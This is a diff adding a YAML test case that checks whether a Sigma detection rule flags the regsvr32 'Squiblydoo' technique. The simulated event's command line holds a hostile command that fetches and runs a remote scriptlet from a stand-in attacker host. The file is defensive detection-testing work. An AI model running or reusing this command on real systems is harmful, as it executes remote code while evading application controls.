@@ -1,0 +1,19 @@
+test_case:
+  name: "Regsvr32 Squiblydoo Technique"
+  description: "Tests detection of regsvr32 abuse for scriptlet execution"
+  rule: "defense_evasion/regsvr32_abuse.yml"
+  rule_type: sigma
+  events:
+    - type: process_create
+      os_type: windows
+      data:
+        path: "C:\\Windows\\System32\\regsvr32.exe"
+        cmdline: "regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll"
+        parent_path: "C:\\Windows\\System32\\cmd.exe"
+        user: "WORKSTATION\\user"
+        pid: 6892
+        ppid: 2048
+  expected: match
+  expected_severity: high
+  expected_mitre: ["T1218.010"]
+  tags: ["defense_evasion", "regsvr32", "positive"]
